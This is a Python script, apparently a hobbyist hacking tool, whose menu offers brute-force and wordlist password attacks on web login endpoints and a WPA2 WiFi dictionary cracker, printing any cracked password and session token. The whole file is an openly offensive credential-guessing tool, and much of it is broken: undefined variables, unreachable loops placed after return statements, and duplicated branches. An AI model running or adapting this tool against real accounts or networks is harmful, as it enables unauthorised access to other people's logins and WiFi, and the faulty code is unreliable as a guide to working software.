import requests
import json
import sys
import pywifi
import time
import itertools

from pywifi import const

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-+!?_#"
buchstaben = list(chars)

class WifiCracker:
	def __init__(self):
		self.wifi = pywifi.PyWiFi()
		self.interface = self.wifi.interfaces()[0]

	def scan(self):
		print("[+] Scanning Networks")
		self.interface.scan()
		time.sleep(8)

		return self.interface.scan_results()

	def lookup_password(self, filename):
		with open(filename, 'r') as f:
			for line in f:
				line = line.replace('\n', '')

				yield line

	def crack(self, ssid: str, filename: str):
		print("[!] Cracking Password with Wordlist")
		print(f"    SSID: {ssid}")
		print(f"    Dictionary: {filename}")

		try:
			profile = pywifi.Profile()
			profile.ssid = ssid
			profile.auth = const.AUTH_ALG_OPEN
			profile.akm.append(const.AKM_TYPE_WPA2PSK)
			profile.cipher = const.CIPHER_TYPE_CCMP

			for password in self.lookup_password(filename):
				profile.key = password
				self.interface.remove_all_network_profiles()

				temp_profile = self.interface.add_network_profile(profile)
				self.interface.connect(temp_profile)
				time.sleep(5)

				if self.interface.status() == const.IFACE_CONNECTED:
					print(f"[KEY] SSID Key: {ssid}\n[KEY] Password Key: {password}")
					time.sleep(6)
					return
		except Exception as e:
			print(e)

		print(f'[FAILED] Password for {ssid} not found')
def WordlistWifiCracker():
	if __name__ == '__main__':
		wifi = WifiCracker()
		sssid = input("[INFORMATIONS] SSID: ")
		dicti = input("[INFORMATIONS] Dictionary: ")
		wifi.crack(sssid, dicti)

print()
print("[00] Login with username and Password [BRUTEFORCE]")
print("[01] Login with email and Password [BRUTEFORCE]")
print("[02] Login with username and Password [WORDLIST]")
print("[03] Login with email and Password [WORDLIST]")
print("[04] WiFi Cracking Login with Password [WORDLIST]")
print()

Option = int(input("Choose-Option> "))

if Option == 0:

	print("[WARNING] The Website got to json acceptet!")
	url = input("Request-url: ")
	user = input("User: ")
	print("[!] Cracking Password with Bruteforce")
	print(f"    Request-url: {url}")
	print(f"    Username: {user}")
	def Userlogin(User, password):
		global output1
		global res
		s = requests.Session()
		payload = {
			'username': user,
			'password': password
		}
		res = s.post(url, json=payload)
		s.headers.update({'authorization': json.loads(res.content)['token']})
		output1 = res.content["success"]
		return s

	for num in range(1, 23):
		for versuch in itertools.product(buchstaben, repeat=num):
			versuch = "".join(versuch)

			session = Userlogin(user, versuch)

			if output1 == 'true':
				print(f"[!] Key Cracked!")
				print(f"[KEY] Account Name: {user}")
				print(f"[KEY] Account Key: {password}")
				print()
				value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
				if value == 'Y':
					print("[TOKEN] Token: " + res.content["token"])
				else:
					if value == 'n':
						print("[WARNING] Program exeting in 5 seconds")
						time.sleep(5)
						sys.exit()
					else:
						if output1 == True:
							print(f"[!] Key Cracked")
							print(f"[KEY] Account User: {user}")
							print(f"[KEY] Account Key: {password}")
							print()
							value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
							if value == 'Y':
								print("[TOKEN] Token: " + res.content["token"])
							else:
								if value == 'n':
									print("[WARNING] Program exeting in 5 seconds")
									time.sleep(5)
									sys.exit()

elif Option == '0':
	print("[WARNING] The Website got to json acceptet!")
	url = input("Request-url: ")
	user = input("User: ")
	print("[!] Cracking Password with Bruteforce")
	print(f"    Request-url: {url}")
	print(f"    Username: {user}")

	def Userlogin(User, password):
		global output1
		global res
		s = requests.Session()
		payload = {
			'username': user,
			'password': password
		}
		res = s.post(url, json=payload)
		s.headers.update({'authorization': json.loads(res.content)['token']})
		output1 = res.content["success"]
		return s

	for num in range(1, 23):
		for versuch in itertools.product(buchstaben, repeat=num):
			versuch = "".join(versuch)

			session = Userlogin(user, versuch)

			if output1 == 'true':
				print(f"[!] Key Cracked!")
				print(f"[KEY] Account Name: {user}")
				print(f"[KEY] Account Key: {password}")
				print()
				value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
				if value == 'Y':
					print("[TOKEN] Token: " + res.content["token"])
				else:
					if value == 'n':
						print("[WARNING] Program exeting in 5 seconds")
						time.sleep(5)
						sys.exit()
					else:
						if output1 == True:
							print(f"[!] Key Cracked")
							print(f"[KEY] Account User: {user}")
							print(f"[KEY] Account Key: {password}")
							print()
							value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
							if value == 'Y':
								print("[TOKEN] Token: " + res.content["token"])
							else:
								if value == 'n':
									print("[WARNING] Program exeting in 5 seconds")
									time.sleep(5)
									sys.exit()
elif Option == 1:
	print("[WARNING] The Website got to json acceptet!")
	url = input("Request-url: ")
	email = input("Email: ")
	print("[!] Cracking Password with Bruteforce")
	print(f"    Request-url: {url}")
	print(f"    Email: {email}")

	def Emaillogin(email, password):
		global output1
		global res
		s = requests.Session()
		payload = {
			'email': email,
			'password': password
		}
		res = s.post(url, json=payload)
		s.headers.update({'authorization': json.loads(res.content)['token']})
		output1 = res.content["success"]
		return s

	for num in range(1, 23):
		for versuch in itertools.product(buchstaben, repeat=num):
			versuch = "".join(versuch)

			session = Emaillogin(email, versuch)

			if output1 == 'true':
				print(f"[!] Key Cracked!")
				print(f"[KEY] Account Email: {email}")
				print(f"[KEY] Account Key: {password}")
				print()
				value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
				if value == 'Y':
					print("[TOKEN] Token: " + res.content["token"])
				else:
					if value == 'n':
						print("[WARNING] Program exeting in 5 seconds")
						time.sleep(5)
						sys.exit()
					else:
						if output1 == True:
							print(f"[!] Key Cracked")
							print(f"[KEY] Account Email: {email}")
							print(f"[KEY] Account Key: {password}")
							print()
							value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
							if value == 'Y':
								print("[TOKEN] Token: " + res.content["token"])
							else:
								if value == 'n':
									print("[WARNING] Program exeting in 5 seconds")
									time.sleep(5)
									sys.exit()
elif Option == '1':
	print("[WARNING] The Website got to json acceptet!")
	url = input("Request-url: ")
	email = input("Email: ")
	print("[!] Cracking Password with Bruteforce")
	print(f"    Request-url: {url}")
	print(f"    Email: {email}")

	def Emaillogin(email, password):
		global output1
		global res
		s = requests.Session()
		payload = {
			'email': email,
			'password': password
		}
		res = s.post(url, json=payload)
		s.headers.update({'authorization': json.loads(res.content)['token']})
		output1 = res.content["success"]
		return s

	for num in range(1, 23):
		for versuch in itertools.product(buchstaben, repeat=num):
			versuch = "".join(versuch)

			session = Emaillogin(email, versuch)

			if output1 == 'true':
				print(f"[!] Key Cracked!")
				print(f"[KEY] Account Email: {email}")
				print(f"[KEY] Account Key: {password}")
				print()
				value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
				if value == 'Y':
					print("[TOKEN] Token: " + res.content["token"])
				else:
					if value == 'n':
						print("[WARNING] Program exeting in 5 seconds")
						time.sleep(5)
						sys.exit()
					else:
						if output1 == True:
							print(f"[!] Key Cracked")
							print(f"[KEY] Account Email: {email}")
							print(f"[KEY] Account Key: {password}")
							print()
							value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
							if value == 'Y':
								print("[TOKEN] Token: " + res.content["token"])
							else:
								if value == 'n':
									print("[WARNING] Program exeting in 5 seconds")
									time.sleep(5)
									sys.exit()
elif Option == 4:
	WordlistWifiCracker()

elif Option == '4':
	WordlistWifiCracker()


elif Option == 2:
	print("[WARNING] The Website got to json acceptet!")
	url = input("Request-url: ")
	user = input("User: ")
	w = input("Dictionary: ")
	print("[!] Cracking Password with Wordlist")
	print(f"    Request-url: {url}")
	print(f"    Username: {user}")
	def Userlogin(User, gen):
		global output1
		global res
		s = requests.Session()
		payload = {
			'username': user,
			'currentkey': gen
		}
		res = s.post(url, json=payload)
		s.headers.update({'authorization': json.loads(res.content)['token']})
		output1 = res.content["success"]
		return s

		fw = open(w, 'r')
		for o in fw:
			Userlogin(user, o)

			if output1 == 'true':
				print(f"[!] Key Cracked!")
				print(f"[KEY] Account Name: {user}")
				print(f"[KEY] Account Key: {gen}")
				print()
				value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
				if value == 'Y':
					print("[TOKEN] Token: " + res.content["token"])
				else:
					if value == 'n':
						print("[WARNING] Program exeting in 5 seconds")
						time.sleep(5)
						sys.exit()
					else:
						if output1 == True:
							print(f"[!] Key Cracked")
							print(f"[KEY] Account User: {user}")
							print(f"[KEY] Account Key: {gen}")
							print()
							value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
							if value == 'Y':
								print("[TOKEN] Token: " + res.content["token"])
							else:
								if value == 'n':
									print("[WARNING] Program exeting in 5 seconds")
									time.sleep(5)
									sys.exit()
elif Option == '2':
	print("[WARNING] The Website got to json acceptet!")
	url = input("Request-url: ")
	user = input("User: ")
	w = input("Dictionary: ")
	print("[!] Cracking Password with Wordlist")
	print(f"    Request-url: {url}")
	print(f"    Username: {user}")
	def Userlogin(User, gen):
		global output1
		global res
		s = requests.Session()
		payload = {
			'username': user,
			'currentkey': gen
		}
		res = s.post(url, json=payload)
		s.headers.update({'authorization': json.loads(res.content)['token']})
		output1 = res.content["success"]
		return s

		fw = open(w, 'r')
		for o in fw:
			Userlogin(user, o)

			if output1 == 'true':
				print(f"[!] Key Cracked!")
				print(f"[KEY] Account Name: {user}")
				print(f"[KEY] Account Key: {gen}")
				print()
				value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
				if value == 'Y':
					print("[TOKEN] Token: " + res.content["token"])
				else:
					if value == 'n':
						print("[WARNING] Program exeting in 5 seconds")
						time.sleep(5)
						sys.exit()
					else:
						if output1 == True:
							print(f"[!] Key Cracked")
							print(f"[KEY] Account User: {user}")
							print(f"[KEY] Account Key: {gen}")
							print()
							value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
							if value == 'Y':
								print("[TOKEN] Token: " + res.content["token"])
							else:
								if value == 'n':
									print("[WARNING] Program exeting in 5 seconds")
									time.sleep(5)
									sys.exit()
elif Option == 3:
	print("[WARNING] The Website got to json acceptet!")
	url = input("Request-url: ")
	user = input("Email: ")
	w = input("Dictionary: ")
	print("[!] Cracking Password with Wordlist")
	print(f"    Request-url: {url}")
	print(f"    Email: {user}")
	def Userlogin(User, gen):
		global output1
		global res
		s = requests.Session()
		payload = {
			'username': user,
			'email': gen
		}
		res = s.post(url, json=payload)
		s.headers.update({'authorization': json.loads(res.content)['token']})
		output1 = res.content["success"]
		return s

		fw = open(w, 'r')
		for o in fw:
			Userlogin(user, o)

			if output1 == 'true':
				print(f"[!] Key Cracked!")
				print(f"[KEY] Account Email: {email}")
				print(f"[KEY] Account Key: {password}")
				print()
				value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
				if value == 'Y':
					print("[TOKEN] Token: " + res.content["token"])
				else:
					if value == 'n':
						print("[WARNING] Program exeting in 5 seconds")
						time.sleep(5)
						sys.exit()
					else:
						if output1 == True:
							print(f"[!] Key Cracked")
							print(f"[KEY] Account Email: {email}")
							print(f"[KEY] Account Key: {password}")
							print()
							value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
							if value == 'Y':
								print("[TOKEN] Token: " + res.content["token"])
							else:
								if value == 'n':
									print("[WARNING] Program exeting in 5 seconds")
									time.sleep(5)
									sys.exit()
elif Option == '3':
	print("[WARNING] The Website got to json acceptet!")
	url = input("Request-url: ")
	user = input("Email: ")
	w = input("Dictionary: ")
	print("[!] Cracking Password with Wordlist")
	print(f"    Request-url: {url}")
	print(f"    Email: {user}")
	def Userlogin(User, gen):
		global output1
		global res
		s = requests.Session()
		payload = {
			'username': user,
			'email': gen
		}
		res = s.post(url, json=payload)
		s.headers.update({'authorization': json.loads(res.content)['token']})
		output1 = res.content["success"]
		return s

		fw = open(w, 'r')
		for o in fw:
			Userlogin(user, o)

			if output1 == 'true':
				print(f"[!] Key Cracked!")
				print(f"[KEY] Account Email: {email}")
				print(f"[KEY] Account Key: {password}")
				print()
				value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
				if value == 'Y':
					print("[TOKEN] Token: " + res.content["token"])
				else:
					if value == 'n':
						print("[WARNING] Program exeting in 5 seconds")
						time.sleep(5)
						sys.exit()
					else:
						if output1 == True:
							print(f"[!] Key Cracked")
							print(f"[KEY] Account Email: {email}")
							print(f"[KEY] Account Key: {password}")
							print()
							value = input("[QUESTION] Do you want see the Token?[Y/n]: ")
							if value == 'Y':
								print("[TOKEN] Token: " + res.content["token"])
							else:
								if value == 'n':
									print("[WARNING] Program exeting in 5 seconds")
									time.sleep(5)
									sys.exit()